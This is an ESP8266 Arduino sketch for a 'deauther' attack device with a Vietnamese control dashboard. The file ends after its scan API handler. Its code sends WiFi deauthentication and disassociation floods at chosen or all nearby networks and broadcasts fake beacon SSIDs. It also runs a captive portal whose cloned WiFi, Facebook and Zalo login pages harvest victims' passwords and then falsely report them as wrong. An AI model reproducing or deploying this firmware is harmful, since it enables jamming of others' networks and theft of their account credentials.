// zenitdev_full_v2.ino
// NodeMCU U3 ESP8266 - FULL FEATURE
// Board: Generic ESP8266 Module, 80MHz, 4M(1M SPIFFS)
// Libs: ESP8266WiFi, ESP8266WebServer, DNSServer, Ticker (built-in)

extern "C" { #include "user_interface.h" }

#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <Ticker.h>

// ========== CONFIG ==========
#define AP_SSID   "ZenitDev_Control"
#define AP_PASS   "12345678"
#define MAX_APS   30
#define MAX_SSIDS 50
#define MAX_CREDS 20

const IPAddress AP_IP(192,168,4,1);
const IPAddress SUBNET(255,255,255,0);

// ========== PACKET TEMPLATES ==========
uint8_t deauth_pkt[26] = {
    0xC0,0x00, 0x00,0x00,
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF, // dst
    0x00,0x00,0x00,0x00,0x00,0x00, // src (bssid)
    0x00,0x00,0x00,0x00,0x00,0x00, // bssid
    0xF0,0xFF, 0x02,0x00
};
uint8_t disassoc_pkt[26] = {
    0xA0,0x00, 0x00,0x00,
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
    0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x00,0x00,
    0xF0,0xFF, 0x02,0x00
};

// ========== AP LIST ==========
struct AP_Info {
    uint8_t bssid[6];
    char    ssid[33];
    uint8_t channel;
    int32_t rssi;
    bool    selected;
};
AP_Info ap_list[MAX_APS];
int     ap_count = 0;

// ========== BEACON SSIDS ==========
char beacon_ssids[MAX_SSIDS][33];
int  beacon_ssid_count = 0;
int  beacon_idx        = 0;
uint8_t beacon_ch      = 1;

// ========== CREDENTIALS ==========
struct Cred {
    char type[12];
    char user[64];
    char pass[64];
    char ts[16];
};
Cred creds[MAX_CREDS];
int  cred_count = 0;

// ========== STATE ==========
struct {
    bool    atk_continuous;
    bool    beacon_spam;
    uint32_t deauth_count;
    uint32_t beacon_count;
    uint32_t uptime;
    char    status[80];
} G = {false,false,0,0,0,"San sang"};

ESP8266WebServer server(80);
DNSServer        dns;
Ticker           atk_ticker;
Ticker           beacon_ticker;

// ========== CORE: SEND DEAUTH ==========
void send_deauth(uint8_t ch, uint8_t *bssid, uint8_t *dst, int n) {
    wifi_set_channel(ch);
    memcpy(deauth_pkt+4,   dst,   6);
    memcpy(deauth_pkt+10,  bssid, 6);
    memcpy(deauth_pkt+16,  bssid, 6);
    memcpy(disassoc_pkt+4, dst,   6);
    memcpy(disassoc_pkt+10,bssid, 6);
    memcpy(disassoc_pkt+16,bssid, 6);
    for (int i=0; i<n; i++) {
        wifi_send_pkt_freedom(deauth_pkt,   26, 0); delayMicroseconds(150);
        wifi_send_pkt_freedom(disassoc_pkt, 26, 0); delayMicroseconds(150);
        G.deauth_count += 2;
    }
}

void atk_selected(int burst) {
    uint8_t bc[6]={0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
    for (int i=0; i<ap_count; i++)
        if (ap_list[i].selected) { send_deauth(ap_list[i].channel,ap_list[i].bssid,bc,burst); yield(); }
}

void atk_broadcast(int burst) {
    uint8_t bc[6]={0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
    uint8_t bssid[6]={0xDE,0xAD,0xBE,0xEF,0x00,0x00};
    for (uint8_t ch=1; ch<=13; ch++) { bssid[5]=ch; send_deauth(ch,bssid,bc,burst); yield(); }
}

// ========== TICKER: CONTINUOUS ATTACK ==========
void atk_tick() {
    if (!G.atk_continuous) return;
    uint8_t bc[6]={0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
    bool any=false;
    for (int i=0; i<ap_count; i++)
        if (ap_list[i].selected) { send_deauth(ap_list[i].channel,ap_list[i].bssid,bc,25); any=true; }
    if (!any) {
        uint8_t fake[6]={0xDE,0xAD,0xBE,0xEF,0x00,0x06};
        send_deauth(6,fake,bc,15);
    }
}

// ========== CORE: BEACON SPAM ==========
void send_beacon_frame(const char *ssid, uint8_t ch, uint8_t sfx) {
    uint8_t pkt[128];
    uint8_t ssid_len = strlen(ssid); if (ssid_len>32) ssid_len=32;

    // Fixed header
    pkt[0]=0x80; pkt[1]=0x00;           // frame ctrl: beacon
    pkt[2]=0x00; pkt[3]=0x00;           // duration
    memset(pkt+4, 0xFF, 6);             // dst broadcast
    pkt[10]=0xDE; pkt[11]=0xAD; pkt[12]=0xBE; pkt[13]=0xEF; pkt[14]=ch; pkt[15]=sfx;
    memcpy(pkt+16, pkt+10, 6);          // bssid = src
    static uint16_t seq=0;
    pkt[22]=(seq<<4)&0xFF; pkt[23]=(seq>>4)&0xFF; seq++;
    uint32_t ts=millis()*1000;
    memcpy(pkt+24,&ts,4); memset(pkt+28,0,4); // timestamp
    pkt[32]=0x64; pkt[33]=0x00;         // beacon interval 100 TU
    pkt[34]=0x31; pkt[35]=0x04;         // capability: ESS+Privacy

    int pos=36;
    pkt[pos++]=0x00; pkt[pos++]=ssid_len;
    memcpy(pkt+pos,ssid,ssid_len); pos+=ssid_len;
    // supported rates
    uint8_t rates[]={0x01,0x08,0x82,0x84,0x8B,0x96,0x24,0x30,0x48,0x6C};
    memcpy(pkt+pos,rates,sizeof(rates)); pos+=sizeof(rates);
    // DS param
    pkt[pos++]=0x03; pkt[pos++]=0x01; pkt[pos++]=ch;

    wifi_set_channel(ch);
    wifi_send_pkt_freedom(pkt,pos,0);
}

void beacon_tick() {
    if (!G.beacon_spam || beacon_ssid_count==0) return;
    send_beacon_frame(beacon_ssids[beacon_idx%beacon_ssid_count], beacon_ch, (uint8_t)beacon_idx);
    G.beacon_count++;
    beacon_ch++; if (beacon_ch>13) { beacon_ch=1; beacon_idx=(beacon_idx+1)%beacon_ssid_count; }
}

// ========== SCAN ==========
void do_scan() {
    WiFi.mode(WIFI_AP_STA);
    WiFi.softAP(AP_SSID,AP_PASS);
    WiFi.disconnect(); delay(100);
    int n=WiFi.scanNetworks(false,true);
    ap_count=0;
    for (int i=0; i<n&&i<MAX_APS; i++) {
        memcpy(ap_list[ap_count].bssid,WiFi.BSSID(i),6);
        strncpy(ap_list[ap_count].ssid,WiFi.SSID(i).c_str(),32);
        ap_list[ap_count].ssid[32]='\0';
        ap_list[ap_count].channel=WiFi.channel(i);
        ap_list[ap_count].rssi=WiFi.RSSI(i);
        ap_list[ap_count].selected=false;
        ap_count++;
    }
    WiFi.scanDelete();
    WiFi.mode(WIFI_AP);
    WiFi.softAPConfig(AP_IP,AP_IP,SUBNET);
    WiFi.softAP(AP_SSID,AP_PASS);
}

// ========== SAVE CREDENTIAL ==========
void save_cred(const char *type, const char *user, const char *pass) {
    if (cred_count>=MAX_CREDS) { memmove(creds,creds+1,sizeof(Cred)*(MAX_CREDS-1)); cred_count=MAX_CREDS-1; }
    strncpy(creds[cred_count].type,type,11);
    strncpy(creds[cred_count].user,user,63);
    strncpy(creds[cred_count].pass,pass,63);
    snprintf(creds[cred_count].ts,16,"%lus",millis()/1000);
    cred_count++;
    Serial.printf("[CRED] %s | %s | %s\n",type,user,pass);
}

// ========== CAPTIVE PORTAL: REDIRECT ==========
void handle_captive() {
    server.sendHeader("Location","http://192.168.4.1/wifi",true);
    server.send(302,"text/plain","");
}

// ========== WEB: DASHBOARD ==========
void handle_root() {
    server.setContentLength(CONTENT_LENGTH_UNKNOWN);
    server.send(200,"text/html","");
    server.sendContent(F("<!DOCTYPE html><html lang='vi'><head><meta charset='UTF-8'>"));
    server.sendContent(F("<meta name='viewport' content='width=device-width,initial-scale=1'>"));
    server.sendContent(F("<title>Zenitdev</title><style>"));
    server.sendContent(F("*{margin:0;padding:0;box-sizing:border-box}"));
    server.sendContent(F("body{background:#0d1117;color:#c9d1d9;font-family:monospace;padding:12px;font-size:13px}"));
    server.sendContent(F("h1{color:#ff4444;text-align:center;font-size:20px;text-shadow:0 0 8px #ff4444;margin-bottom:2px}"));
    server.sendContent(F(".sub{text-align:center;color:#8b949e;font-size:10px;margin-bottom:14px}"));
    server.sendContent(F(".tabs{display:flex;gap:3px;margin-bottom:12px;flex-wrap:wrap}"));
    server.sendContent(F(".tab{padding:7px 12px;border:1px solid #30363d;border-radius:4px;cursor:pointer;font-size:11px;background:#161b22;color:#8b949e}"));
    server.sendContent(F(".tab.on{background:#da3633;color:#fff;border-color:#da3633}"));
    server.sendContent(F(".pg{display:none}.pg.on{display:block}"));
    server.sendContent(F(".card{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:12px;margin-bottom:10px}"));
    server.sendContent(F(".card h2{color:#ff6b6b;font-size:11px;text-transform:uppercase;letter-spacing:1px;margin-bottom:8px;border-bottom:1px solid #30363d;padding-bottom:5px}"));
    server.sendContent(F(".btn{background:#da3633;color:#fff;border:none;padding:7px 14px;border-radius:4px;cursor:pointer;font-size:11px;font-weight:bold;margin:2px}"));
    server.sendContent(F(".btn:hover{background:#b91c1c}.bg{background:#21262d;color:#c9d1d9;border:1px solid #30363d}.bg:hover{background:#30363d}"));
    server.sendContent(F(".bgreen{background:#238636}.bgreen:hover{background:#2ea043}"));
    server.sendContent(F(".byellow{background:#9e6a03}.byellow:hover{background:#b07f00}"));
    server.sendContent(F(".stat{display:flex;justify-content:space-between;padding:5px 0;border-bottom:1px dotted #21262d;font-size:11px}"));
    server.sendContent(F(".stat:last-child{border-bottom:none}.v{color:#f0f6fc;font-weight:bold}"));
    server.sendContent(F("table{width:100%;border-collapse:collapse;font-size:11px}"));
    server.sendContent(F("th{background:#21262d;color:#8b949e;padding:5px;text-align:left;border-bottom:1px solid #30363d}"));
    server.sendContent(F("td{padding:5px;border-bottom:1px solid #21262d}tr:hover td{background:#1c2128}"));
    server.sendContent(F("input[type=checkbox]{accent-color:#da3633;cursor:pointer}"));
    server.sendContent(F("input[type=text]{background:#0d1117;color:#c9d1d9;border:1px solid #30363d;padding:6px;border-radius:4px;width:100%;margin:4px 0;font-size:12px}"));
    server.sendContent(F("#msg,#msg2{color:#58a6ff;font-size:11px;margin-top:6px;min-height:14px}"));
    server.sendContent(F(".warn{background:rgba(210,153,34,.1);border:1px solid rgba(210,153,34,.3);color:#e3b341;padding:7px;border-radius:4px;font-size:11px;margin-bottom:7px}"));
    server.sendContent(F("</style></head><body>"));
    server.sendContent(F("<h1>ZENITDEV DEAUTHER</h1>"));
    server.sendContent(F("<div class='sub'>Make by NVH | NodeMCU U3 | 2.4GHz | v2.0</div>"));

    // Tabs
    server.sendContent(F("<div class='tabs'>"));
    server.sendContent(F("<div class='tab on' onclick='tab(this,\"pa\")'>TAN CONG</div>"));
    server.sendContent(F("<div class='tab' onclick='tab(this,\"pb\")'>BEACON SPAM</div>"));
    server.sendContent(F("<div class='tab' onclick='tab(this,\"pp\")'>PORTAL</div>"));
    server.sendContent(F("<div class='tab' onclick='tab(this,\"pc\")'>CREDENTIALS</div>"));
    server.sendContent(F("<div class='tab' onclick='tab(this,\"ps\")'>STATUS</div>"));
    server.sendContent(F("</div>"));

    // ===== TAB: TAN CONG =====
    server.sendContent(F("<div class='pg on' id='pa'>"));
    server.sendContent(F("<div class='card'><h2>Quet Mang WiFi</h2>"));
    server.sendContent(F("<div class='warn'>Quet ~3s - web mat ket noi tam thoi</div>"));
    server.sendContent(F("<button class='btn' onclick='doScan()'>QUET NGAY</button>"));
    server.sendContent(F("<button class='btn bg' onclick='selAll(1)'>CHON TAT CA</button>"));
    server.sendContent(F("<button class='btn bg' onclick='selAll(0)'>BO CHON</button>"));
    server.sendContent(F("<div style='overflow-x:auto;margin-top:8px'><table>"));
    server.sendContent(F("<thead><tr><th>SSID</th><th>BSSID</th><th>CH</th><th>RSSI</th><th>CHN</th><th>JAM</th></tr></thead>"));
    server.sendContent(F("<tbody id='apb'><tr><td colspan=6 style='text-align:center;color:#8b949e'>Chua quet</td></tr></tbody>"));
    server.sendContent(F("</table></div></div>"));

    server.sendContent(F("<div class='card'><h2>Mode Tan Cong</h2>"));
    server.sendContent(F("<button class='btn bgreen' id='bcont' onclick='atkCont()'>LOOP LIEN TUC: OFF</button>"));
    server.sendContent(F("<button class='btn' onclick='atkSel()'>1 LAN (DA CHON)</button>"));
    server.sendContent(F("<button class='btn byellow' onclick='atkBcast()'>BROADCAST KENH 1-13</button>"));
    server.sendContent(F("<div id='msg'>San sang.</div></div></div>"));

    // ===== TAB: BEACON SPAM =====
    server.sendContent(F("<div class='pg' id='pb'>"));
    server.sendContent(F("<div class='card'><h2>Beacon Spam - Phat SSID Gia</h2>"));
    server.sendContent(F("<p style='color:#8b949e;font-size:11px;margin-bottom:8px'>Phat hang tram SSID gia lam nhieu WiFi scanner xung quanh</p>"));
    server.sendContent(F("<input type='text' id='bci' placeholder='Ten mang gia - Enter de them' onkeydown='if(event.key==\"Enter\")addS()'>"));
    server.sendContent(F("<button class='btn' onclick='addS()'>THEM</button>"));
    server.sendContent(F("<button class='btn bg' onclick='loadDef()'>DANH SACH MAC DINH (50)</button>"));
    server.sendContent(F("<button class='btn bg' onclick='clearS()'>XOA</button>"));
    server.sendContent(F("<div id='slist' style='margin:8px 0;color:#8b949e;font-size:11px;word-break:break-all'></div>"));
    server.sendContent(F("<button class='btn bgreen' id='bbs' onclick='bStart()'>BAT DAU BEACON SPAM</button>"));
    server.sendContent(F("<button class='btn bg' onclick='bStop()'>DUNG</button>"));
    server.sendContent(F("<div id='msg2'>San sang.</div></div></div>"));

    // ===== TAB: PORTAL =====
    server.sendContent(F("<div class='pg' id='pp'>"));
    server.sendContent(F("<div class='card'><h2>Captive Portal - Phishing Page</h2>"));
    server.sendContent(F("<p style='color:#8b949e;font-size:11px;margin-bottom:10px'>Thiet bi ket noi ZenitDev_Control se tu dong chuyen den trang phishing</p>"));
    server.sendContent(F("<div class='stat'><span>Trang WiFi Password</span><span class='v'><a href='/wifi' style='color:#58a6ff' target='_blank'>Mo /wifi</a></span></div>"));
    server.sendContent(F("<div class='stat'><span>Trang Facebook</span><span class='v'><a href='/facebook' style='color:#58a6ff' target='_blank'>Mo /facebook</a></span></div>"));
    server.sendContent(F("<div class='stat'><span>Trang Zalo</span><span class='v'><a href='/zalo' style='color:#58a6ff' target='_blank'>Mo /zalo</a></span></div>"));
    server.sendContent(F("<div class='stat'><span>DNS Redirect</span><span class='v' style='color:#3fb950'>HOAT DONG</span></div>"));
    server.sendContent(F("<div class='stat'><span>Credentials thu duoc</span><span class='v' id='pcc'>0</span></div>"));
    server.sendContent(F("</div></div>"));

    // ===== TAB: CREDENTIALS =====
    server.sendContent(F("<div class='pg' id='pc'>"));
    server.sendContent(F("<div class='card'><h2>Credentials Da Thu Thap</h2>"));
    server.sendContent(F("<button class='btn bg' onclick='loadC()'>TAI LAI</button>"));
    server.sendContent(F("<button class='btn bg' onclick='clearC()'>XOA TAT CA</button>"));
    server.sendContent(F("<div style='overflow-x:auto;margin-top:8px'><table>"));
    server.sendContent(F("<thead><tr><th>Loai</th><th>Username/SDT</th><th>Password</th><th>Thoi gian</th></tr></thead>"));
    server.sendContent(F("<tbody id='cb'><tr><td colspan=4 style='text-align:center;color:#8b949e'>Chua co</td></tr></tbody>"));
    server.sendContent(F("</table></div></div></div>"));

    // ===== TAB: STATUS =====
    server.sendContent(F("<div class='pg' id='ps'>"));
    server.sendContent(F("<div class='card'><h2>Thong Ke He Thong</h2>"));
    server.sendContent(F("<div class='stat'><span>Frame Deauth Gui</span><span class='v' id='sdc'>0</span></div>"));
    server.sendContent(F("<div class='stat'><span>Beacon Da Phat</span><span class='v' id='sbc'>0</span></div>"));
    server.sendContent(F("<div class='stat'><span>AP Da Quet</span><span class='v' id='sapc'>0</span></div>"));
    server.sendContent(F("<div class='stat'><span>Credentials</span><span class='v' id='scc'>0</span></div>"));
    server.sendContent(F("<div class='stat'><span>Uptime</span><span class='v' id='sup'>0s</span></div>"));
    server.sendContent(F("<div class='stat'><span>Trang Thai</span><span class='v' id='sst'>-</span></div>"));
    server.sendContent(F("<div class='stat'><span>Continuous Attack</span><span class='v' id='sca'>OFF</span></div>"));
    server.sendContent(F("<div class='stat'><span>Beacon Spam</span><span class='v' id='sbs'>OFF</span></div>"));
    server.sendContent(F("</div></div>"));

    // ===== SCRIPT =====
    server.sendContent(F("<script>"));
    server.sendContent(F("function tab(e,i){document.querySelectorAll('.tab').forEach(t=>t.classList.remove('on'));document.querySelectorAll('.pg').forEach(p=>p.classList.remove('on'));e.classList.add('on');document.getElementById(i).classList.add('on');}\n"));

    // AP table
    server.sendContent(F("function loadAPs(){fetch('/api/aps').then(r=>r.json()).then(d=>{"));
    server.sendContent(F("let b='';d.aps.forEach(a=>{b+='<tr>';"));
    server.sendContent(F("b+='<td>'+(a.ssid||'(hidden)')+'</td>';"));
    server.sendContent(F("b+='<td style=\"font-size:10px\">'+a.bssid+'</td>';"));
    server.sendContent(F("b+='<td style=\"color:#79c0ff\">'+a.ch+'</td>';"));
    server.sendContent(F("b+='<td style=\"color:#d2a8ff\">'+a.rssi+'</td>';"));
    server.sendContent(F("b+='<td><input type=\"checkbox\" '+(a.sel?'checked':'')+' onchange=\"tog('+a.id+',this.checked)\"></td>';"));
    server.sendContent(F("b+='<td><button class=\"btn\" style=\"padding:3px 8px\" onclick=\"jam1('+a.id+')\">JAM</button></td></tr>';"));
    server.sendContent(F("});document.getElementById('apb').innerHTML=b||'<tr><td colspan=6 style=\"text-align:center\">Khong co mang</td></tr>';"));
    server.sendContent(F("}).catch(e=>{});}\n"));

    server.sendContent(F("function doScan(){document.getElementById('msg').textContent='Dang quet...';"));
    server.sendContent(F("fetch('/api/scan').then(r=>r.json()).then(d=>{document.getElementById('msg').textContent='Tim thay '+d.count+' mang';loadAPs();}).catch(()=>setTimeout(loadAPs,4000));}\n"));
    server.sendContent(F("function tog(id,v){fetch('/api/select?id='+id+'&val='+(v?'1':'0'));}\n"));
    server.sendContent(F("function selAll(v){fetch('/api/select_all?val='+v).then(()=>loadAPs());}\n"));

    // Attack
    server.sendContent(F("var con=false;"));
    server.sendContent(F("function atkCont(){con=!con;fetch('/api/attack?mode='+(con?'cont_on':'cont_off')).then(r=>r.json()).then(d=>{document.getElementById('bcont').textContent='LOOP LIEN TUC: '+(con?'ON':'OFF');document.getElementById('msg').textContent=d.status;});}\n"));
    server.sendContent(F("function atkSel(){document.getElementById('msg').textContent='Dang tan cong...';fetch('/api/attack?mode=selected&burst=80&loops=5').then(r=>r.json()).then(d=>{document.getElementById('msg').textContent=d.status;});}\n"));
    server.sendContent(F("function atkBcast(){document.getElementById('msg').textContent='Broadcast 1-13...';fetch('/api/attack?mode=broadcast&burst=100').then(r=>r.json()).then(d=>{document.getElementById('msg').textContent=d.status;});}\n"));
    server.sendContent(F("function jam1(id){document.getElementById('msg').textContent='JAM AP #'+id+'...';fetch('/api/attack?mode=single&id='+id+'&burst=300').then(r=>r.json()).then(d=>{document.getElementById('msg').textContent=d.status;});}\n"));

    // Beacon
    server.sendContent(F("var SS=[];"));
    server.sendContent(F("function addS(){var v=document.getElementById('bci').value.trim();if(!v)return;SS.push(v);document.getElementById('bci').value='';renderS();}\n"));
    server.sendContent(F("function clearS(){SS=[];renderS();}\n"));
    server.sendContent(F("function renderS(){document.getElementById('slist').textContent='Danh sach ('+SS.length+'): '+SS.slice(0,10).join(', ')+(SS.length>10?'...':'');}\n"));
    server.sendContent(F("function loadDef(){fetch('/api/beacon_def').then(r=>r.json()).then(d=>{SS=d.ssids;renderS();document.getElementById('msg2').textContent='Da tai '+d.ssids.length+' SSID mac dinh';});}\n"));
    server.sendContent(F("function bStart(){if(!SS.length){document.getElementById('msg2').textContent='Them SSID truoc!';return;}"));
    server.sendContent(F("fetch('/api/beacon_start',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ssids:SS})}).then(r=>r.json()).then(d=>{document.getElementById('msg2').textContent=d.status;document.getElementById('bbs').textContent='BEACON SPAM: ON';});}\n"));
    server.sendContent(F("function bStop(){fetch('/api/beacon_stop').then(r=>r.json()).then(d=>{document.getElementById('msg2').textContent=d.status;document.getElementById('bbs').textContent='BAT DAU BEACON SPAM';});}\n"));

    // Creds
    server.sendContent(F("function loadC(){fetch('/api/creds').then(r=>r.json()).then(d=>{"));
    server.sendContent(F("let b='';d.creds.forEach(c=>{b+='<tr><td>'+c.type+'</td><td>'+c.user+'</td><td>'+c.pass+'</td><td>'+c.ts+'</td></tr>';});"));
    server.sendContent(F("document.getElementById('cb').innerHTML=b||'<tr><td colspan=4 style=\"text-align:center\">Chua co</td></tr>';"));
    server.sendContent(F("document.getElementById('pcc').textContent=d.count;"));
    server.sendContent(F("});}\n"));
    server.sendContent(F("function clearC(){fetch('/api/creds_clear').then(()=>loadC());}\n"));

    // Poll
    server.sendContent(F("setInterval(()=>{fetch('/api/status').then(r=>r.json()).then(d=>{"));
    server.sendContent(F("document.getElementById('sdc').textContent=d.deauth_count;"));
    server.sendContent(F("document.getElementById('sbc').textContent=d.beacon_count;"));
    server.sendContent(F("document.getElementById('sapc').textContent=d.ap_count;"));
    server.sendContent(F("document.getElementById('scc').textContent=d.cred_count;"));
    server.sendContent(F("document.getElementById('sup').textContent=d.uptime+'s';"));
    server.sendContent(F("document.getElementById('sst').textContent=d.status;"));
    server.sendContent(F("document.getElementById('sca').textContent=d.atk_continuous?'ON':'OFF';"));
    server.sendContent(F("document.getElementById('sbs').textContent=d.beacon_spam?'ON':'OFF';"));
    server.sendContent(F("}).catch(e=>{});},1000);loadAPs();\n"));
    server.sendContent(F("</script></body></html>"));
    server.sendContent("");
}

// ========== CAPTIVE: WIFI PAGE ==========
void handle_wifi_page() {
    server.setContentLength(CONTENT_LENGTH_UNKNOWN);
    server.send(200,"text/html","");
    server.sendContent(F("<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>"));
    server.sendContent(F("<title>Xac thuc mang WiFi</title><style>"));
    server.sendContent(F("*{margin:0;padding:0;box-sizing:border-box}body{background:#f0f2f5;font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}"));
    server.sendContent(F(".box{background:#fff;border-radius:10px;padding:28px;width:100%;max-width:360px;box-shadow:0 2px 12px rgba(0,0,0,.15)}"));
    server.sendContent(F(".ico{text-align:center;font-size:48px;margin-bottom:10px}.ttl{text-align:center;font-size:20px;font-weight:bold;color:#333;margin-bottom:6px}"));
    server.sendContent(F(".sub{text-align:center;color:#666;font-size:13px;margin-bottom:20px}"));
    server.sendContent(F("input{width:100%;padding:13px 14px;border:1px solid #ddd;border-radius:8px;font-size:14px;margin-bottom:12px;outline:none}"));
    server.sendContent(F("input:focus{border-color:#1877f2;box-shadow:0 0 0 2px rgba(24,119,242,.15)}"));
    server.sendContent(F(".btn{width:100%;padding:13px;background:#1877f2;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:bold;cursor:pointer}"));
    server.sendContent(F(".btn:hover{background:#166fe5}</style></head><body><div class='box'>"));
    server.sendContent(F("<div class='ico'>&#x1F4F6;</div>"));
    server.sendContent(F("<div class='ttl'>Xac thuc mang WiFi</div>"));
    server.sendContent(F("<div class='sub'>Vui long nhap mat khau WiFi de ket noi internet</div>"));
    server.sendContent(F("<form method='POST' action='/wifi_submit'>"));
    server.sendContent(F("<input name='user' type='text' placeholder='Ten tai khoan / Email'>"));
    server.sendContent(F("<input name='pass' type='password' placeholder='Mat khau WiFi'>"));
    server.sendContent(F("<button class='btn' type='submit'>Xac nhan ket noi</button>"));
    server.sendContent(F("</form></div></body></html>"));
    server.sendContent("");
}

// ========== CAPTIVE: FACEBOOK PAGE ==========
void handle_fb_page() {
    server.setContentLength(CONTENT_LENGTH_UNKNOWN);
    server.send(200,"text/html","");
    server.sendContent(F("<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>"));
    server.sendContent(F("<title>Facebook</title><style>"));
    server.sendContent(F("*{margin:0;padding:0;box-sizing:border-box}body{background:#f0f2f5;font-family:Helvetica,Arial,sans-serif}"));
    server.sendContent(F(".nav{background:#1877f2;padding:10px 20px;color:#fff;font-size:22px;font-weight:bold;letter-spacing:-0.5px}"));
    server.sendContent(F(".wrap{display:flex;justify-content:center;align-items:flex-start;padding:30px 16px;gap:24px;flex-wrap:wrap}"));
    server.sendContent(F(".left{max-width:380px;padding-top:40px}.left h2{font-size:26px;font-weight:300;color:#1c1e21;margin-bottom:10px;line-height:1.3}"));
    server.sendContent(F(".left p{font-size:16px;color:#606770}"));
    server.sendContent(F(".fbox{background:#fff;border-radius:8px;padding:18px;width:100%;max-width:360px;box-shadow:0 2px 8px rgba(0,0,0,.2)}"));
    server.sendContent(F("input{width:100%;padding:13px 16px;border:1px solid #ddd;border-radius:6px;font-size:16px;margin-bottom:10px;outline:none}"));
    server.sendContent(F("input:focus{border-color:#1877f2;box-shadow:0 0 0 2px rgba(24,119,242,.15)}"));
    server.sendContent(F(".bln{width:100%;padding:13px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-size:18px;font-weight:bold;cursor:pointer;margin-bottom:10px}"));
    server.sendContent(F(".bln:hover{background:#166fe5}.hr{border:none;border-top:1px solid #ddd;margin:10px 0}"));
    server.sendContent(F(".bnw{display:block;text-align:center;padding:12px;background:#42b72a;color:#fff;border-radius:6px;font-size:16px;font-weight:bold;text-decoration:none}"));
    server.sendContent(F("</style></head><body><div class='nav'>facebook</div><div class='wrap'>"));
    server.sendContent(F("<div class='left'><h2>Facebook giup ban ket noi va chia se voi moi nguoi trong cuoc song cua ban.</h2></div>"));
    server.sendContent(F("<div class='fbox'><form method='POST' action='/facebook_submit'>"));
    server.sendContent(F("<input name='user' type='text' placeholder='Email hoac so dien thoai'>"));
    server.sendContent(F("<input name='pass' type='password' placeholder='Mat khau'>"));
    server.sendContent(F("<button class='bln' type='submit'>Dang nhap</button>"));
    server.sendContent(F("</form><hr class='hr'><a href='/facebook' class='bnw'>Tao tai khoan moi</a></div></div></body></html>"));
    server.sendContent("");
}

// ========== CAPTIVE: ZALO PAGE ==========
void handle_zalo_page() {
    server.setContentLength(CONTENT_LENGTH_UNKNOWN);
    server.send(200,"text/html","");
    server.sendContent(F("<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>"));
    server.sendContent(F("<title>Zalo</title><style>"));
    server.sendContent(F("*{margin:0;padding:0;box-sizing:border-box}body{background:#EDF1F5;font-family:Arial,sans-serif}"));
    server.sendContent(F(".hdr{background:#0068FF;padding:14px 20px;color:#fff;font-size:22px;font-weight:bold}"));
    server.sendContent(F(".wrap{display:flex;justify-content:center;padding:40px 16px}"));
    server.sendContent(F(".box{background:#fff;border-radius:10px;padding:26px;width:100%;max-width:360px;box-shadow:0 2px 10px rgba(0,0,0,.15)}"));
    server.sendContent(F("h3{color:#333;font-size:20px;margin-bottom:6px;text-align:center}"));
    server.sendContent(F("p{color:#999;font-size:13px;text-align:center;margin-bottom:18px}"));
    server.sendContent(F("input{width:100%;padding:12px 14px;border:1px solid #e0e0e0;border-radius:8px;font-size:14px;margin-bottom:12px;outline:none}"));
    server.sendContent(F("input:focus{border-color:#0068FF}"));
    server.sendContent(F(".btn{width:100%;padding:13px;background:#0068FF;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:bold;cursor:pointer}"));
    server.sendContent(F(".btn:hover{background:#0055cc}</style></head><body>"));
    server.sendContent(F("<div class='hdr'>Zalo</div><div class='wrap'><div class='box'>"));
    server.sendContent(F("<h3>Dang nhap Zalo</h3><p>Nhap so dien thoai va mat khau de tiep tuc</p>"));
    server.sendContent(F("<form method='POST' action='/zalo_submit'>"));
    server.sendContent(F("<input name='user' type='tel' placeholder='So dien thoai'>"));
    server.sendContent(F("<input name='pass' type='password' placeholder='Mat khau'>"));
    server.sendContent(F("<button class='btn' type='submit'>Dang nhap</button>"));
    server.sendContent(F("</form></div></div></body></html>"));
    server.sendContent("");
}

// ========== SUBMIT: GHI CREDENTIAL ==========
void do_submit(const char *type) {
    String user=server.arg("user"), pass=server.arg("pass");
    if (user.length()>0||pass.length()>0) save_cred(type,user.c_str(),pass.c_str());
    // Gia mat khau sai, redirect ve lai
    String redir=String(type);
    String html="<!DOCTYPE html><html><head><meta charset='UTF-8'>";
    html+="<meta http-equiv='refresh' content='2;url=/"+redir+"'>";
    html+="</head><body style='background:#f0f2f5;display:flex;justify-content:center;align-items:center;height:100vh;font-family:Arial'>";
    html+="<div style='text-align:center;color:#c00'><b>Mat khau khong chinh xac. Vui long thu lai...</b></div></body></html>";
    server.send(200,"text/html",html);
}
void handle_wifi_submit()     { do_submit("wifi"); }
void handle_fb_submit()       { do_submit("facebook"); }
void handle_zalo_submit()     { do_submit("zalo"); }

// ========== API ==========
void handle_api_aps() {
    String j="{\"count\":"+String(ap_count)+",\"aps\":[";
    for (int i=0; i<ap_count; i++) {
        char bs[18];
        snprintf(bs,18,"%02X:%02X:%02X:%02X:%02X:%02X",
            ap_list[i].bssid[0],ap_list[i].bssid[1],ap_list[i].bssid[2],
            ap_list[i].bssid[3],ap_list[i].bssid[4],ap_list[i].bssid[5]);
        j+="{\"id\":"+String(i)+",\"ssid\":\""+String(ap_list[i].ssid)+"\",\"bssid\":\""+String(bs)+"\",";
        j+="\"ch\":"+String(ap_list[i].channel)+",\"rssi\":"+String(ap_list[i].rssi)+",";
        j+="\"sel\":"+(ap_list[i].selected?String("true"):String("false"))+"}";
        if (i<ap_count-1) j+=",";
    }
    j+="]}";
    server.send(200,"application/json",j);
}

void handle_api_scan() {
    WiFi.mode(WIFI_AP_STA); WiFi.softAP(AP_SSID,AP_PASS);
    do_scan();
    server.send(200,"application/json","{\"ok\":true,\"count\":"+String(ap_count)+"}");
}

